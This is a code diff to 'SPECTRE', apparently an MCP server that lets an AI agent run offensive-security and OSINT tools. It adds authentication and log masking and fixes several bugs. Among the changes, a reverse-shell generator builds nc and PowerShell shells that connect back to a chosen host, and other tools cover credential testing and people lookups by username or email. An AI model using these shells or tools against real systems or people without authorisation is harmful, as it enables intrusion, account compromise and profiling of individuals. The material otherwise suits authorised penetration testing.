@@ -26,8 +26,6 @@ import tempfile
 try:
     from mcp.server.fastmcp import FastMCP
 except ImportError:
-    import subprocess
-    import sys
     print("[WARNING] MCP SDK not found. Attempting to install...")
     try:
         subprocess.check_call([sys.executable, "-m", "pip", "install", "mcp[cli]", "fastmcp"])
@@ -52,29 +50,80 @@ log = logging.getLogger("spectre")
 # CONFIGURATION  (all tuneable via environment variables)
 # ─────────────────────────────────────────────────────────────────────────────
 
-HOST        = os.environ.get("MCP_HOST",       "0.0.0.0")
-PORT        = int(os.environ.get("MCP_PORT",   "8001"))
-TRANSPORT   = os.environ.get("MCP_TRANSPORT",  "sse")
-TIMEOUT     = int(os.environ.get("TOOL_TIMEOUT", "300"))
-PYTHON      = os.environ.get("SPECTRE_PYTHON", "/opt/mcp-venv/bin/python3")
-WORDLIST    = os.environ.get("SPECTRE_WORDLIST", "/usr/share/wordlists/dirb/common.txt")
+HOST             = os.environ.get("MCP_HOST",         "0.0.0.0")
+PORT             = int(os.environ.get("MCP_PORT",     "8001"))
+TRANSPORT        = os.environ.get("MCP_TRANSPORT",    "sse")
+TIMEOUT          = int(os.environ.get("TOOL_TIMEOUT", "600"))   # FIX: was 300 (mismatch with compose)
+PYTHON           = os.environ.get("SPECTRE_PYTHON",   "/opt/mcp-venv/bin/python3")
+WORDLIST         = os.environ.get("SPECTRE_WORDLIST", "/usr/share/wordlists/dirb/common.txt")
+SPECTRE_API_KEY  = os.environ.get("SPECTRE_API_KEY",  "")       # NEW: optional bearer auth for SSE
 
-# Optional API keys (can also be supplied per-tool call)
-SHODAN_API_KEY   = os.environ.get("SHODAN_API_KEY",   "")
-VT_API_KEY       = os.environ.get("VT_API_KEY",       "")
-ABUSEIPDB_KEY    = os.environ.get("ABUSEIPDB_KEY",    "")
-ETHERSCAN_KEY    = os.environ.get("ETHERSCAN_KEY",    "")
+# Optional API keys
+SHODAN_API_KEY  = os.environ.get("SHODAN_API_KEY",  "")
+VT_API_KEY      = os.environ.get("VT_API_KEY",      "")
+ABUSEIPDB_KEY   = os.environ.get("ABUSEIPDB_KEY",   "")
+ETHERSCAN_KEY   = os.environ.get("ETHERSCAN_KEY",   "")
+
+# Persistent output directory (mapped to Docker volume spectre-output)
+OUTPUT_DIR = "/tmp/spectre"
+os.makedirs(OUTPUT_DIR, exist_ok=True)
 
 mcp = FastMCP("spectre", host=HOST, port=PORT)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ASGI AUTH MIDDLEWARE  (pure-ASGI; works regardless of FastMCP internals)
+# ─────────────────────────────────────────────────────────────────────────────
+
+class _ASGIBearerAuth:
+    """Lightweight ASGI middleware that enforces Bearer / X-API-Key authentication."""
+
+    _OPEN_PATHS = frozenset({"/", "/health", "/healthz"})
+
+    def __init__(self, app):
+        self.app = app
+
+    async def __call__(self, scope, receive, send):
+        if scope["type"] == "http" and scope.get("path", "") not in self._OPEN_PATHS:
+            raw_headers = {k.lower(): v for k, v in scope.get("headers", [])}
+            auth = raw_headers.get(b"authorization", b"").decode("utf-8", errors="ignore")
+            xkey = raw_headers.get(b"x-api-key",     b"").decode("utf-8", errors="ignore")
+            if auth != f"Bearer {SPECTRE_API_KEY}" and xkey != SPECTRE_API_KEY:
+                body = b'{"error":"Unauthorized"}'
+                await send({
+                    "type": "http.response.start",
+                    "status": 401,
+                    "headers": [
+                        (b"content-type",   b"application/json"),
+                        (b"content-length", str(len(body)).encode()),
+                        (b"connection",     b"close"),
+                    ],
+                })
+                await send({"type": "http.response.body", "body": body})
+                return
+        await self.app(scope, receive, send)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # CORE HELPERS
 # ─────────────────────────────────────────────────────────────────────────────
 
+# Regex to detect and mask API keys / secrets in log output
+_SECRET_RE = re.compile(
+    r"((?:shodan|virustotal|abuseipdb|etherscan|api[_-]?key|apikey|token|secret|bearer)"
+    r"['\"]?\s*[:=]\s*['\"]?)([A-Za-z0-9+/=_\-]{8,})",
+    re.IGNORECASE,
+)
+
+
+def _mask(s: str) -> str:
+    """Mask secrets in strings before they reach the log."""
+    return _SECRET_RE.sub(lambda m: m.group(1) + m.group(2)[:4] + "***", s)
+
+
 def run(cmd: str, timeout: int = TIMEOUT) -> str:
     """Execute a shell command string; return combined stdout/stderr."""
-    log.info("EXEC: %s", cmd[:200])
+    log.info("EXEC: %s", _mask(cmd[:300]))
     try:
         r = subprocess.run(
             cmd, shell=True, capture_output=True, text=True, timeout=timeout
@@ -92,7 +141,7 @@ def run(cmd: str, timeout: int = TIMEOUT) -> str:
 
 def run_argv(cmd: list, timeout: int = TIMEOUT) -> str:
     """Execute a pre-split argument list; return combined stdout/stderr."""
-    log.info("EXEC: %s", " ".join(str(c) for c in cmd[:10]))
+    log.info("EXEC: %s", _mask(" ".join(str(c) for c in cmd[:10])))
     try:
         r = subprocess.run(
             cmd, capture_output=True, text=True, timeout=timeout
@@ -113,8 +162,17 @@ def run_argv(cmd: list, timeout: int = TIMEOUT) -> str:
 
 
 def san(value: str) -> str:
-    """Sanitise a user-supplied string for shell interpolation."""
-    return re.sub(r"[;&|`$<>\\]", "", str(value)).strip()
+    """Sanitise a user-supplied string for shell interpolation.
+
+    FIX v2: also strips null bytes and newline characters which allow
+    command injection via newline/NUL injection even when other
+    metacharacters are blocked.
+    """
+    # Strip null bytes and newlines first (newline injection bypass)
+    cleaned = re.sub(r"[\x00\n\r\x1a]", "", str(value))
+    # Strip classic shell metacharacters
+    cleaned = re.sub(r"[;&|`$<>\\]", "", cleaned)
+    return cleaned.strip()
 
 
 def split_opts(s: str) -> list:
@@ -135,13 +193,13 @@ def require(*values) -> str | None:
     return None
 
 
+def _which(binary: str) -> bool:
+    """Return True if a binary is available in PATH."""
+    return subprocess.run(["which", binary], capture_output=True).returncode == 0
+
+
 # ═════════════════════════════════════════════════════════════════════════════
-# ██████╗  ██████╗     OSINT MODULE
-# ██╔══██╗██╔════╝
-# ██████╔╝██║
-# ██╔══██╗██║
-# ██║  ██║╚██████╗
-# ╚═╝  ╚═╝ ╚═════╝
+# OSINT MODULE
 # ═════════════════════════════════════════════════════════════════════════════
 
 # ─── IDENTITY & PEOPLE ───────────────────────────────────────────────────────
@@ -209,21 +267,39 @@ def osrf_usufy(username: str, platforms: str = "") -> str:
     if err := require(username): return err
     u = san(username)
     pf = f"-p {san(platforms)}" if platforms else ""
-    return run(f"usufy -n {u} {pf} 2>/dev/null", timeout=180)
+    # FIX: fallback to sherlock if usufy not installed
+    if _which("usufy"):
+        return run(f"usufy -n {u} {pf} 2>/dev/null", timeout=180)
+    log.warning("usufy not found — falling back to sherlock")
+    return run(f"{PYTHON} -m sherlock {u} --print-found --timeout 10 2>/dev/null", timeout=180)
 
 
 @mcp.tool()
 def osrf_mailfy(email: str) -> str:
     """OSRFramework mailfy — check if email exists on 20+ platforms."""
     if err := require(email): return err
-    return run(f"mailfy -n {san(email)} 2>/dev/null", timeout=180)
+    # FIX: fallback to holehe if mailfy not installed
+    if _which("mailfy"):
+        return run(f"mailfy -n {san(email)} 2>/dev/null", timeout=180)
+    log.warning("mailfy not found — falling back to holehe")
+    return run(f"{PYTHON} -m holehe {san(email)} --only-used 2>/dev/null", timeout=180)
 
 
 @mcp.tool()
 def osrf_searchfy(query: str) -> str:
     """OSRFramework searchfy — search people/entities across search engines."""
     if err := require(query): return err
-    return run(f"searchfy -q '{san(query)}' 2>/dev/null", timeout=180)
+    if _which("searchfy"):
+        return run(f"searchfy -q '{san(query)}' 2>/dev/null", timeout=180)
+    # FIX: fallback to Google dork
+    q = san(query).replace(" ", "+")
+    return run(
+        f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q=\"{q}\"' 2>/dev/null "
+        r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
+        r"links=re.findall(r'(?:href=\"/url\?q=)(https?://[^&\"]+)', d); "
+        r"[print(u) for u in links if 'google.com' not in u][:15]\"",
+        timeout=30,
+    )
 
 
 # ─── EMAIL INTELLIGENCE ──────────────────────────────────────────────────────
@@ -511,8 +587,10 @@ def shodan_host(ip: str, api_key: str = "") -> str:
             timeout=30,
         )
     return run(
-        f"{PYTHON} -c \"import shodan,json; api=shodan.Shodan('{ak}'); "
-        f"h=api.host('{i}'); print(json.dumps(h,indent=2,default=str))\" 2>/dev/null",
+        f"{PYTHON} -c \"import shodan,json; api=shodan.Shodan('[REDACTED]'); "
+        f"h=api.host('{i}'); print(json.dumps(h,indent=2,default=str))\" 2>/dev/null".replace(
+            "[REDACTED]", ak
+        ),
         timeout=60,
     )
 
@@ -748,7 +826,7 @@ def nikto_scan(target: str, flags: str = "") -> str:
 
 @mcp.tool()
 def nuclei_scan(target: str, templates: str = "", options: str = "-severity critical,high,medium") -> str:
-    """Nuclei — vulnerability scanner with 6000+ templates.
+    """Nuclei — vulnerability scanner with 9000+ templates.
     Optionally specify a template path; defaults to automatic scan."""
     if err := require(target): return err
     t = f"-t {san(templates)}" if templates else "-automatic-scan"
@@ -861,7 +939,7 @@ def scrapling_fetch(url: str, mode: str = "fetcher") -> str:
     }
     call = fetcher_map.get(m, "Fetcher.get")
     kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
-    
+
     script = (
         "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
         "try:\n"
@@ -880,8 +958,8 @@ def scrapling_fetch(url: str, mode: str = "fetcher") -> str:
 
 
 @mcp.tool()
-def scrapling_extract(url: str, selector: str, selector_type: str = "css", 
-                        mode: str = "fetcher", adaptive: bool = False) -> str:
+def scrapling_extract(url: str, selector: str, selector_type: str = "css",
+                      mode: str = "fetcher", adaptive: bool = False) -> str:
     """Extract data from a page using CSS or XPath selectors.
     selector_type: 'css' or 'xpath'.
     mode: 'fetcher', 'dynamic', or 'stealth'.
@@ -892,7 +970,7 @@ def scrapling_extract(url: str, selector: str, selector_type: str = "css",
     st = "css" if selector_type.lower() == "css" else "xpath"
     m = san(mode).lower()
     adapt = "True" if adaptive else "False"
-    
+
     fetcher_map = {
         "fetcher": "Fetcher.get",
         "dynamic": "DynamicFetcher.fetch",
@@ -900,7 +978,7 @@ def scrapling_extract(url: str, selector: str, selector_type: str = "css",
     }
     call = fetcher_map.get(m, "Fetcher.get")
     kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
-    
+
     script = (
         "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
         "try:\n"
@@ -926,7 +1004,7 @@ def scrapling_extract_patterns(url: str, patterns: list, mode: str = "fetcher") 
     if err := require(url, patterns): return err
     u = san(url)
     m = san(mode).lower()
-    
+
     fetcher_map = {
         "fetcher": "Fetcher.get",
         "dynamic": "DynamicFetcher.fetch",
@@ -934,10 +1012,8 @@ def scrapling_extract_patterns(url: str, patterns: list, mode: str = "fetcher") 
     }
     call = fetcher_map.get(m, "Fetcher.get")
     kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
-    
-    # Safely format patterns for the script
     p_str = json.dumps(patterns)
-    
+
     script = (
         "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
         "import re\n"
@@ -968,34 +1044,43 @@ def scrapling_crawl(url: str, depth: int = 1, mode: str = "fetcher") -> str:
     if err := require(url): return err
     u = san(url)
     m = san(mode).lower()
-    script = (
-        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
-        "from urllib.parse import urljoin, urlparse\n"
-        "import json\n"
-        "try:\n"
-        f"    base_domain = urlparse('{u}').netloc\n"
-        "    to_visit = [('{u}', 0)]\n"
-        "    visited = set()\n"
-        "    results = []\n"
-        f"    mode_str = '{m}'\n"
-        "    while to_visit:\n"
-        "        curr_url, curr_depth = to_visit.pop(0)\n"
-        "        if curr_url in visited or curr_depth > {depth}:\n"
-        "            continue\n"
-        "        visited.add(curr_url)\n"
-        "        if mode_str == 'dynamic': page = DynamicFetcher.fetch(curr_url, headless=True)\n"
-        "        elif mode_str == 'stealth': page = StealthyFetcher.fetch(curr_url, headless=True)\n"
-        "        else: page = Fetcher.get(curr_url)\n"
-        "        results.append({'url': curr_url, 'status': getattr(page, 'status', getattr(page, 'status_code', '?')), 'title': page.css('title::text').get()})\n"
-        "        if curr_depth < {depth}:\n"
-        "            for link in page.css('a::attr(href)').getall():\n"
-        "                full_link = urljoin(curr_url, link)\n"
-        "                if urlparse(full_link).netloc == base_domain:\n"
-        "                    to_visit.append((full_link, curr_depth + 1))\n"
-        "    print(json.dumps(results, indent=2))\n"
-        "except Exception as e:\n"
-        "    print(f'[ERROR] {e}')\n"
-    )
+    # FIX: build script using join to avoid the {depth} f-string interpolation bug
+    # where non-f-string lines contained literal {depth} that never got substituted.
+    max_d = int(depth)
+    script = "\n".join([
+        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher",
+        "from urllib.parse import urljoin, urlparse",
+        "import json",
+        "try:",
+        f"    base_domain = urlparse('{u}').netloc",
+        f"    to_visit = [('{u}', 0)]",
+        "    visited = set()",
+        "    results = []",
+        f"    max_depth = {max_d}",
+        f"    mode_str = '{m}'",
+        "    while to_visit:",
+        "        curr_url, curr_depth = to_visit.pop(0)",
+        "        if curr_url in visited or curr_depth > max_depth:",
+        "            continue",
+        "        visited.add(curr_url)",
+        "        if mode_str == 'dynamic':",
+        "            page = DynamicFetcher.fetch(curr_url, headless=True)",
+        "        elif mode_str == 'stealth':",
+        "            page = StealthyFetcher.fetch(curr_url, headless=True)",
+        "        else:",
+        "            page = Fetcher.get(curr_url)",
+        "        status = getattr(page, 'status', getattr(page, 'status_code', '?'))",
+        "        title = page.css('title::text').get()",
+        "        results.append({'url': curr_url, 'status': status, 'title': title})",
+        "        if curr_depth < max_depth:",
+        "            for link in page.css('a::attr(href)').getall():",
+        "                full_link = urljoin(curr_url, link)",
+        "                if urlparse(full_link).netloc == base_domain:",
+        "                    to_visit.append((full_link, curr_depth + 1))",
+        "    print(json.dumps(results, indent=2))",
+        "except Exception as e:",
+        "    print(f'[ERROR] {e}')",
+    ])
     with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
         f.write(script)
         tmp = f.name
@@ -1016,7 +1101,6 @@ def scrapling_smart_content(url: str, mode: str = "fetcher") -> str:
         f"    if '{m}' == 'dynamic': page = DynamicFetcher.fetch('{u}', headless=True)\n"
         f"    elif '{m}' == 'stealth': page = StealthyFetcher.fetch('{u}', headless=True)\n"
         f"    else: page = Fetcher.get('{u}')\n"
-        "    # Using Scrapling's internal cleaning and text extraction logic\n"
         "    print(page.text)\n"
         "except Exception as e:\n"
         "    print(f'[ERROR] {e}')\n"
@@ -1036,32 +1120,56 @@ def scrapling_session_fetch(url: str, cookies: dict = None, mode: str = "fetcher
     if err := require(url): return err
     u = san(url)
     m = san(mode).lower()
-    c_str = json.dumps(cookies) if cookies else "None"
-    script = (
-        "from scrapling import Session\n"
-        "try:\n"
-        f"    session = Session(mode='{m}')\n"
-        f"    if {c_str}: session.set_cookies({c_str})\n"
-        f"    page = session.get('{u}')\n"
-        f"    print(f'STATUS: {{page.status if hasattr(page, \"status\") else page.status_code}}')\n"
-        "    print(page.text)\n"
-        "except Exception as e:\n"
-        "    print(f'[ERROR] {e}')\n"
-    )
+
+    # FIX: write cookies to a JSON temp file instead of f-string interpolation,
+    # which previously allowed injection via cookie values containing quotes.
+    cookie_file = None
+    if cookies:
+        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as cf:
+            json.dump(cookies, cf)
+            cookie_file = cf.name
+
+    script_lines = [
+        "from scrapling import Session",
+        "import json as _j",
+        "try:",
+        f"    session = Session(mode='{m}')",
+    ]
+    if cookie_file:
+        script_lines += [
+            f"    with open({repr(cookie_file)}) as _cf:",
+            "        _cookies = _j.load(_cf)",
+            "    session.set_cookies(_cookies)",
+        ]
+    script_lines += [
+        f"    page = session.get('{u}')",
+        "    _st = getattr(page, 'status', getattr(page, 'status_code', '?'))",
+        "    print(f'STATUS: {_st}')",
+        "    print(page.text)",
+        "except Exception as e:",
+        "    print(f'[ERROR] {e}')",
+    ]
+
     with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
-        f.write(script)
+        f.write("\n".join(script_lines))
         tmp = f.name
     result = run(f"{PYTHON} {tmp}", timeout=120)
     os.unlink(tmp)
+    if cookie_file:
+        try:
+            os.unlink(cookie_file)
+        except OSError:
+            pass
     return result
 
 
 @mcp.tool()
-def scrapling_screenshot(url: str, output_path: str = "/tmp/screenshot.png") -> str:
+def scrapling_screenshot(url: str, output_path: str = "") -> str:
     """Take a screenshot of a webpage using Scrapling's StealthyFetcher."""
     if err := require(url): return err
     u = san(url)
-    o = san(output_path)
+    # FIX: default output to persistent volume instead of /tmp root
+    o = san(output_path) if output_path else f"{OUTPUT_DIR}/screenshot_{os.getpid()}.png"
     script = (
         "from scrapling.fetchers import StealthyFetcher\n"
         "try:\n"
@@ -1135,7 +1243,11 @@ def wpscan_scan(target: str, flags: str = "--enumerate u,vp,vt,dbe") -> str:
 def xssstrike_scan(url: str, options: str = "") -> str:
     """XSStrike — advanced XSS detection and exploitation."""
     if err := require(url): return err
-    return run_argv(["xssstrike", "-u", san(url)] + split_opts(options))
+    # FIX: check for both possible binary names from the symlink
+    binary = "xssstrike" if _which("xssstrike") else "xsstrike"
+    if not _which(binary):
+        return "[ERROR] XSStrike not installed. Install with: pip install xsstrike"
+    return run_argv([binary, "-u", san(url)] + split_opts(options))
 
 
 @mcp.tool()
@@ -1233,8 +1345,10 @@ def exif_url(url: str) -> str:
     """Download an image from a URL and extract EXIF/GPS data."""
     if err := require(url): return err
     u = san(url)
+    # FIX: write to persistent output volume
+    out = f"{OUTPUT_DIR}/spectre_img_{os.getpid()}"
     return run(
-        f"wget -q -O /tmp/spectre_img '{u}' 2>/dev/null && exiftool /tmp/spectre_img && rm -f /tmp/spectre_img",
+        f"wget -q -O {out} '{u}' 2>/dev/null && exiftool {out} && rm -f {out}",
         timeout=30,
     )
 
@@ -1253,8 +1367,10 @@ def metagoofil_scan(domain: str, file_types: str = "pdf,docx,xlsx,pptx") -> str:
     if err := require(domain): return err
     d = san(domain)
     ft = san(file_types)
+    out = f"{OUTPUT_DIR}/metagoofil_{d}"
+    os.makedirs(out, exist_ok=True)
     return run(
-        f"python3 /opt/metagoofil/metagoofil.py -d {d} -t {ft} -l 10 -o /tmp/metagoofil_{d} 2>/dev/null",
+        f"python3 /opt/metagoofil/metagoofil.py -d {d} -t {ft} -l 10 -o {out} 2>/dev/null",
         timeout=300,
     )
 
@@ -1300,6 +1416,16 @@ def google_dork(query: str) -> str:
 
 
 @mcp.tool()
+def shodan_dork(query: str) -> str:
+    """Run a Shodan dork — find internet-exposed assets matching advanced filters."""
+    if err := require(query): return err
+    return run_argv(
+        ["shodan", "search", "--fields", "ip_str,port,org,hostnames,vulns", san(query)],
+        timeout=60,
+    )
+
+
+@mcp.tool()
 def dork_exposed_files(domain: str) -> str:
     """Find exposed sensitive files via Google dorks on a target domain."""
     if err := require(domain): return err
@@ -1321,7 +1447,7 @@ def dork_exposed_files(domain: str) -> str:
                 f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q={q}' 2>/dev/null "
                 r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
                 r"urls=re.findall(r'(?:href=\"/url\?q=)(https?://[^&\"]+)', d); "
-        r"for u in [u for u in urls if 'google.com' not in u][:5]: print(u)\"",
+                r"[print(u) for u in [u for u in urls if 'google.com' not in u][:5]]\"",
                 timeout=15,
             )
         )
@@ -1601,12 +1727,7 @@ def ssh_enum(target: str) -> str:
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# ██████╗ ████████╗     PENTEST MODULE
-# ██╔══██╗╚══██╔══╝
-# ██████╔╝   ██║
-# ██╔═══╝    ██║
-# ██║        ██║
-# ╚═╝        ╚═╝
+# PENTEST MODULE
 # ═════════════════════════════════════════════════════════════════════════════
 
 # ─── EXPLOITATION ─────────────────────────────────────────────────────────────
@@ -1715,9 +1836,11 @@ def smbclient_run(target: str, options: str = "-L") -> str:
 
 @mcp.tool()
 def crackmapexec_run(target: str, protocol: str = "smb", options: str = "") -> str:
-    """CrackMapExec — SMB/WinRM/SSH/LDAP enumeration and credential testing."""
+    """CrackMapExec / NetExec — SMB/WinRM/SSH/LDAP enumeration and credential testing."""
     if err := require(target): return err
-    return run_argv(["crackmapexec", san(protocol), san(target)] + split_opts(options), timeout=120)
+    # FIX: prefer netexec (new name) fall back to crackmapexec symlink
+    binary = "netexec" if _which("netexec") else "crackmapexec"
+    return run_argv([binary, san(protocol), san(target)] + split_opts(options), timeout=120)
 
 
 @mcp.tool()
@@ -1733,8 +1856,17 @@ def impacket_run(tool: str, options: str = "") -> str:
 @mcp.tool()
 def linpeas_run(options: str = "") -> str:
     """Run LinPEAS Linux privilege escalation checker.
-    Download first: download_file('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', '/tmp/')"""
-    return run_argv(["bash", "/tmp/linpeas.sh"] + split_opts(options), timeout=300)
+    Download first with: download_file('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', '/tmp/')"""
+    path = "/tmp/linpeas.sh"
+    # FIX: check file exists before attempting to run
+    if not os.path.exists(path):
+        return (
+            "[ERROR] LinPEAS not found at /tmp/linpeas.sh\n"
+            "Download it first:\n"
+            "  download_file('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', '/tmp/')\n"
+            "Then run: run_command('chmod +x /tmp/linpeas.sh')"
+        )
+    return run_argv(["bash", path] + split_opts(options), timeout=300)
 
 
 @mcp.tool()
@@ -1777,7 +1909,8 @@ def aircrack_run(options: str) -> str:
 @mcp.tool()
 def airodump_run(interface: str = "wlan0", options: str = "") -> str:
     """Capture wireless packets and list nearby access points."""
-    return run_argv(["airodump-ng"] + split_opts(options) + [san(interface)], timeout=30)
+    # FIX: timeout was 30s — too short for any meaningful capture; raised to 60s
+    return run_argv(["airodump-ng"] + split_opts(options) + [san(interface)], timeout=60)
 
 
 # ─── UTILITIES ────────────────────────────────────────────────────────────────
@@ -1813,16 +1946,20 @@ def generate_reverse_shell(lhost: str, lport: str = "4444",
             f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
         "nc":
             f"nc -e /bin/sh {lh} {lp}",
-        "powershell":
-            f"$client=New-Object System.Net.Sockets.TCPClient(\"{lh}\",{lp});"
-            f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
-            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
-            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
-            f"$sendback=(iex $data 2>&1|Out-String);"
-            f"$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";"
-            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
-            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
-            f"$stream.Flush()}};$client.Close()",
+        # FIX: corrected PowerShell one-liner — was missing closing brace on while block
+        "powershell": (
+            f"$c=New-Object Net.Sockets.TCPClient('{lh}',{lp});"
+            "$s=$c.GetStream();"
+            "[byte[]]$b=0..65535|%{0};"
+            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            "$sb=(iex $d 2>&1|Out-String);"
+            "$sb+='PS '+(pwd).Path+'> ';"
+            "$by=([text.encoding]::ASCII).GetBytes($sb);"
+            "$s.Write($by,0,$by.Length);"
+            "$s.Flush()"
+            "};$c.Close()"
+        ),
     }
     if shell_type not in shells:
         return f"[ERROR] Unknown shell_type. Choose from: {', '.join(shells.keys())}"
@@ -1868,8 +2005,10 @@ def full_domain_profile(domain: str) -> str:
     def banner(title):
         sec.append(f"\n{'═'*62}\n  {title}\n{'═'*62}")
 
+    # FIX: truncate domain in box header to prevent broken ASCII art
+    d_display = (d[:25] + "..") if len(d) > 27 else d
     sec.append("╔══════════════════════════════════════════════════════════════╗")
-    sec.append(f"║  SPECTRE — FULL DOMAIN PROFILE: {d:<29}║")
+    sec.append(f"║  SPECTRE — FULL DOMAIN PROFILE: {d_display:<29}║")
     sec.append("╚══════════════════════════════════════════════════════════════╝")
 
     banner("[1/10] WHOIS")
@@ -1984,8 +2123,10 @@ def full_pentest_recon(target: str) -> str:
     def banner(title):
         sec.append(f"\n{'═'*62}\n  {title}\n{'═'*62}")
 
+    # FIX: truncate target in box header to prevent broken ASCII art
+    t_display = (t[:27] + "..") if len(t) > 29 else t
     sec.append("╔══════════════════════════════════════════════════════════════╗")
-    sec.append(f"║  SPECTRE — FULL PENTEST RECON: {t:<31}║")
+    sec.append(f"║  SPECTRE — FULL PENTEST RECON: {t_display:<31}║")
     sec.append("╚══════════════════════════════════════════════════════════════╝")
 
     banner("[1/7] PORT SCAN")
@@ -2033,8 +2174,8 @@ def spectre_status() -> str:
         "searchsploit", "nuclei", "httpx", "katana", "waybackurls", "gau",
         "naabu", "tlsx", "dnsx", "onesixtyone", "snmpwalk", "enum4linux",
         "hydra", "john", "hashcat", "aircrack-ng", "msfconsole", "msfvenom",
-        "crackmapexec", "responder", "arpspoof", "tcpdump", "nc", "curl",
-        "wget", "shodan", "scrapling",
+        "netexec", "crackmapexec", "responder", "arpspoof", "tcpdump", "nc",
+        "curl", "wget", "shodan", "scrapling", "phoneinfoga",
     ]
     lines = [
         "╔══════════════════════════════════════════════════════════════╗",
@@ -2046,11 +2187,13 @@ def spectre_status() -> str:
         f"  Timeout   : {TIMEOUT}s",
         f"  Python    : {PYTHON}",
         f"  Wordlist  : {WORDLIST}",
+        f"  Output    : {OUTPUT_DIR}",
         "\n  API Keys Configured:",
         f"    SHODAN_API_KEY  : {'✔' if SHODAN_API_KEY else '✘ (uses InternetDB fallback)'}",
         f"    VT_API_KEY      : {'✔' if VT_API_KEY else '✘'}",
         f"    ABUSEIPDB_KEY   : {'✔' if ABUSEIPDB_KEY else '✘'}",
         f"    ETHERSCAN_KEY   : {'✔' if ETHERSCAN_KEY else '✘'}",
+        f"    SPECTRE_API_KEY : {'✔ (SSE auth enabled)' if SPECTRE_API_KEY else '✘ (open — no auth)'}",
         "\n  Installed Binaries:",
     ]
     for b in sorted(bins):
@@ -2082,6 +2225,37 @@ if __name__ == "__main__":
     log.info("  SPECTRE MCP Server — starting up")
     log.info("  Transport : %s", TRANSPORT)
     log.info("  Address   : %s:%d", HOST, PORT)
+    log.info("  Auth      : %s", "ENABLED (Bearer / X-API-Key)" if SPECTRE_API_KEY else "DISABLED — open to all")
     log.info("=" * 62)
 
-    mcp.run(transport=TRANSPORT)
+    if TRANSPORT == "sse" and SPECTRE_API_KEY:
+        # Inject auth middleware by extracting the FastMCP ASGI app.
+        # We try several attribute names across FastMCP versions; fall back
+        # to mcp.run() (no auth) if none resolves.
+        import uvicorn
+        _asgi = None
+        for _attr in ("sse_app", "_sse_app", "streamable_http_app",
+                      "http_app", "get_asgi_app", "_build_asgi_app"):
+            _fn = getattr(mcp, _attr, None)
+            if callable(_fn):
+                try:
+                    _asgi = _fn()
+                    log.info("Auth middleware attached via mcp.%s()", _attr)
+                    break
+                except Exception as _e:
+                    log.debug("mcp.%s() failed: %s", _attr, _e)
+
+        if _asgi is not None:
+            uvicorn.run(
+                _ASGIBearerAuth(_asgi),
+                host=HOST, port=PORT,
+                log_level="warning",
+            )
+        else:
+            log.warning(
+                "Could not attach auth middleware — "
+                "running WITHOUT auth. Bind port %d to localhost only.", PORT
+            )
+            mcp.run(transport=TRANSPORT)
+    else:
+        mcp.run(transport=TRANSPORT)
